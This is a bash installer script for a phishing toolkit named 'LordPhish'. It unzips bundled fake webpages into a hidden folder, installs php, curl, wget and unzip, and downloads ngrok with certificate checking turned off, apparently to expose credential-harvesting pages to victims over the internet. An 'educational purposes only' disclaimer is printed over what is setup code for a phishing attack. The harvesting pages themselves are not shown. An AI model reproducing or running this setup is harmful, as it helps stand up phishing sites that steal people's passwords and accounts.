#!/usr/bin/env bash

red='\e[1;31m'

UnzipFiles(){
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;93m [!] Unzipping files ...!\e[0m\n"
    sleep 1.9
    nohup unzip sites.zip > /dev/null &
    mv webpages .webpages
}
smail_banner() {
printf "\n"
printf "\n"
printf "${red}█░░ █▀█ █▀█ █▀▄ █▀█ █░█ █ █▀ █░█\n"
printf "${red}█▄▄ █▄█ █▀▄ █▄▀ █▀▀ █▀█ █ ▄█ █▀█\n"
printf "      \e[1;97m  .:.  Version 2.0 Beta  .:.  \e[0m\n"
printf "\n"
printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX \e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by LordPhish.  ::\e[0m\n"
printf "     \e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
printf "\n"
printf "     \e[101m\e[1;77m:: Attacking targets without mutual consent is illegal!      ::\e[0m\n"
printf "\n"   
}

install() {
    echo -e "\n[*] Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n[*] Installing package : proot "
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
	        chmod +x lord.sh
		echo -e "\n[*] Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n[*] Installing package : $pkg"
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg"
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n[!] Unsupported package manager, Install packages manually."
					{ exit 1; }
				fi
			}
		done
	fi

}
InstallNgrok(){
    if [[ -e ngrok ]]; then
    chmod +x ngrok

else
    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
        wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

        if [[ -e ngrok-stable-linux-arm.zip ]]; then
            unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok-stable-linux-arm.zip
        else
            printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
    if [[ -e ngrok-stable-linux-386.zip ]]; then
        unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
        chmod +x ngrok
        rm -rf ngrok-stable-linux-386.zip
else
    printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi
}

UnzipFiles
smail_banner
install
InstallNgrok

